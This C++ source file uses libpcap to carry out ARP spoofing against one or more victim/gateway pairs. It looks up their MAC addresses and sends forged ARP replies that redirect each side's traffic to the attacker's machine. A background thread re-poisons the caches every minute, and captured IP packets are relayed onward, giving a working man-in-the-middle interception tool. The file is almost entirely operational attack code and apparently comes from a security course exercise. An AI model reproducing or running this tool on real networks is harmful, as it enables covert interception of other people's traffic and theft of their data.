#include <cstdio>
#include <stdint.h>
#include <pcap.h>
#include <string.h>
#include <string>
#include <stdlib.h> 
#include <vector>
#include <unordered_map>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <thread>
#include <mutex>
#include <atomic>
#include <chrono>
#include "eth_hdr.h"
#include "arp_hdr.h"
#include "ip_hdr.h"

std::mutex g_send_mtx;

struct EthArpPacket {
	eth_hdr eth;
	arp_hdr arp;
};

struct EthIpPacket {
	eth_hdr eth;
	ip_hdr ip;
};

struct Flow {
    uint8_t vip[4];   // victim(sender) IP
    uint8_t tip[4];   // target(gateway) IP
    uint8_t vmac[6];  // victim MAC
    uint8_t tmac[6];  // target MAC
    EthArpPacket attackSender; // poison victim:  gateway IP -> mymac
    EthArpPacket attackTarget; // poison target:  victim  IP -> mymac
};

uint8_t* split(uint8_t* tip, char argv[])
{
    char* token = strtok(argv, ".");
    int i = 0;
    while (token != NULL && i < 4) {
        tip[i++] = atoi(token);
        token = strtok(NULL, ".");
    }
    return tip;
}

void getMyMac(u_char *mymac, char NI[])
{
	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Failed to create socket");
        exit(1);
    }

    char* ifname = NI;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);

    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("Failed to get MAC address");
        exit(1);
    }
    close(sockfd);
	memcpy(mymac, ifr.ifr_hwaddr.sa_data, 6);
}

void getMyIP(uint8_t *myIP, char NI[])
{
	struct ifaddrs *ifaddr, *ifa;
    int family, s;
    char myip[NI_MAXHOST] = {0};  

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        exit(EXIT_FAILURE);
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL)
            continue;

        family = ifa->ifa_addr->sa_family;

        if (family == AF_INET) { 
            if (strcmp(ifa->ifa_name, NI) == 0) {
                s = getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in),
                                myip, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
                if (s != 0) {
                    printf("getnameinfo() failed: %s\n", gai_strerror(s));
                    freeifaddrs(ifaddr);
                    exit(EXIT_FAILURE);
                }
                break;
            }
        }
    }

    freeifaddrs(ifaddr);
	myIP = split(myIP, myip);

}

EthArpPacket makeArpPacket(uint16_t oper, u_char *smac, u_char *dmac, u_char *arp_smac, u_char *arp_tmac, uint8_t *sip, uint8_t *tip)
{
	EthArpPacket packet;

	packet.eth.ethType = htons(0x0806);
	packet.arp.HType = htons(0x0001);
	packet.arp.PType = htons(0x0800);
	packet.arp.HLen = 0x06;
	packet.arp.PLen = 0x04;
	packet.arp.Oper = htons(oper);

	for(int i=0; i<6; i++){
		packet.eth.smac[i]=smac[i];
		packet.eth.dmac[i]=dmac[i];
		packet.arp.smac[i]=arp_smac[i];
		packet.arp.tmac[i]=arp_tmac[i];
	}

	for(int i=0; i<4; i++){
	packet.arp.sip[i] = sip[i];
	packet.arp.tip[i] = tip[i];
	}

	return packet;
}

void sendArp(pcap_t* pcap, const EthArpPacket packet)
{
    std::lock_guard<std::mutex> lk(g_send_mtx);
    printf("sent an ARP packet\n");
    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
}

void sendPacket(pcap_t* pcap, const u_char *packet, size_t size)
{
    std::lock_guard<std::mutex> lk(g_send_mtx);
    int res = pcap_sendpacket(pcap, packet, size);
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
}

void SendIpRelayPacket(pcap_t* pcap, const u_char *spoofed_data, const EthIpPacket* spoofed_packet, uint8_t mymac[], const uint8_t vmac[], const uint8_t tmac[], size_t eth_len, size_t total_len)
{
			EthIpPacket relay_header = *spoofed_packet;
			bool SenderToTarget = true;
			bool TargetToSender = true;
	
			for(int i=0; i<6; i++)
			{
				if(spoofed_packet->eth.smac[i] != vmac[i]) SenderToTarget = false;
				if(spoofed_packet->eth.smac[i] != tmac[i]) TargetToSender = false;
			}

			if(SenderToTarget) 
			{
				for(int i=0; i<6; i++)
				{
					relay_header.eth.dmac[i] = tmac[i];
					relay_header.eth.smac[i] = mymac[i];
				}
				u_char *relay_packet = (u_char*)malloc(total_len);
				memcpy(relay_packet, &relay_header.eth, sizeof(eth_hdr));
				memcpy(relay_packet + eth_len, spoofed_data + eth_len, total_len - eth_len);
				sendPacket(pcap, relay_packet, total_len);
				free(relay_packet);
			}
			else if(TargetToSender)
			{
				for(int i=0; i<6; i++)
				{
					relay_header.eth.dmac[i] = vmac[i];
					relay_header.eth.smac[i] = mymac[i];
					}

				u_char *relay_packet = (u_char*)malloc(total_len);
				memcpy(relay_packet, &relay_header.eth, sizeof(eth_hdr));
				memcpy(relay_packet + eth_len, spoofed_data + eth_len, total_len - eth_len);
				sendPacket(pcap, relay_packet, total_len);
				free(relay_packet);
			}
			
}

void getArp(pcap_t* pcap, pcap_pkthdr **header, const u_char **data)
{
	int res = pcap_next_ex(pcap, header, data);
	if(res != 1)
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	}
}

void getPacket(pcap_t* pcap, pcap_pkthdr **header, const u_char **data)
{
	int res = pcap_next_ex(pcap, header, data);
	if(res != 1)
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	}
}

void getMac(pcap_t* pcap, pcap_t* res_pcap, const EthArpPacket packet, uint8_t *mac, uint8_t *sip, uint8_t *tip)
{
		while(true){

		sendArp(pcap, packet);

		printf("receiving packets\n");
		struct pcap_pkthdr *header;
		const u_char *data;

		getArp(res_pcap, &header, &data);
		const EthArpPacket* res_packet = reinterpret_cast<const EthArpPacket*>(data);

		if (ntohs(res_packet->eth.ethType) != 0x0806) continue;
		if (ntohs(res_packet->arp.Oper) != 0x0002) continue;
		bool trueRes = true;
		for(int i=0; i<4; i++){
			if(res_packet->arp.sip[i] != tip[i] || res_packet->arp.tip[i] != sip[i])
			{
				trueRes = false;
				continue;
			}
		}
		if(trueRes){
			memcpy(mac, res_packet->arp.smac, sizeof(uint8_t)*6 );
			break;
		}
		}
}

void periodic_arp(std::atomic<bool>& running,
                  pcap_t* pcap,
                  const std::vector<Flow>& flows)
{
    using namespace std::chrono;
    while (running.load(std::memory_order_relaxed)) {
        for (const auto& f : flows) {
            sendArp(pcap, f.attackSender);
            sendArp(pcap, f.attackTarget);
        }
        printf("[periodic] re-poisoned %zu flows\n", flows.size());
        std::this_thread::sleep_for(minutes(1));
    }
}


int main(int argc, char* argv[]) 
{

if (argc < 4 || ((argc - 2) % 2) != 0) {
    fprintf(stderr, "Usage: %s <interface> <sender-ip1> <target-ip1> [<sender-ip2> <target-ip2> ...]\n", argv[0]);
    return EXIT_FAILURE;
}

	u_char mymac[6];
	uint8_t myip[4];
	getMyMac(mymac, argv[1]);
	getMyIP(myip, argv[1]);

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, 0, 0, 0, errbuf);
	pcap_t* res_pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr || res_pcap == nullptr) 
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	u_char ff[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
	u_char zero[] = {0,0,0,0,0,0};

	std::vector<Flow> flows;
	flows.reserve((argc - 2)/2);

	for (int i = 2; i < argc; i += 2) {
    Flow f{};
    uint8_t vip_arr[4], tip_arr[4];
    split(vip_arr, argv[i]);  
    split(tip_arr, argv[i+1]); 
    memcpy(f.vip, vip_arr, 4);
    memcpy(f.tip, tip_arr, 4);

    const EthArpPacket SenderPacket = makeArpPacket(0x0001, mymac, ff, mymac, zero, myip, f.vip);
    const EthArpPacket TargetPacket = makeArpPacket(0x0001, mymac, ff, mymac, zero, myip, f.tip);
    getMac(pcap, res_pcap, SenderPacket, f.vmac, myip, f.vip);
    getMac(pcap, res_pcap, TargetPacket, f.tmac, myip, f.tip);

    f.attackSender = makeArpPacket(0x0002, mymac, f.vmac, mymac, f.vmac, f.tip, f.vip);
    f.attackTarget = makeArpPacket(0x0002, mymac, f.tmac, mymac, f.tmac, f.vip, f.tip);

    sendArp(pcap, f.attackSender);
    sendArp(pcap, f.attackTarget);

    flows.push_back(f);
    printf("[init] flow %d ready: victim=%s, target=%s\n", (i-2)/2 + 1, argv[i], argv[i+1]);
}

	// int cnt = (argc -2) / 2;
	// int i = 2;
	// while(cnt--)
	// {
	// get sender's MAC

		printf("Attacked %zu flows\n", flows.size());

		static std::atomic<bool> keep_running(true);
		std::thread keep_poison(periodic_arp, std::ref(keep_running), pcap, std::cref(flows));
		keep_poison.detach();

		// listen
		while(true)
		{
			struct pcap_pkthdr *spoofed_header;
			const u_char *spoofed_data;
			getPacket(res_pcap, &spoofed_header, &spoofed_data);

			const EthIpPacket* spoofed_packet = reinterpret_cast<const EthIpPacket*>(spoofed_data);
			if (spoofed_header->caplen < sizeof(eth_hdr)) continue;
			size_t eth_len = sizeof(eth_hdr);
			size_t total_len = spoofed_header->caplen;

			const Flow* hit = nullptr;
   			bool fromSender = false;
    		bool fromTarget = false;

			for (const auto& f : flows) {	
			if (memcmp(spoofed_packet->eth.smac, f.vmac, 6) == 0) {
				hit = &f; 
				fromSender = true; 
				break;
			}
			if (memcmp(spoofed_packet->eth.smac, f.tmac, 6) == 0) {
				hit = &f; 
				fromTarget = true; 
				break;
			}
		}
			if (!hit) continue; 
			
			if(ntohs(spoofed_packet->eth.ethType) == 0x0800)		
				SendIpRelayPacket(pcap, spoofed_data, spoofed_packet, mymac, hit->vmac, hit->tmac, eth_len, total_len);

			if(ntohs(spoofed_packet->eth.ethType) == 0x0806)
				{
					if(fromSender) sendArp(pcap, hit->attackSender);
					if(fromTarget) sendArp(pcap, hit->attackTarget);
				}
			
		}

	//}
	pcap_close(res_pcap);
	pcap_close(pcap);

}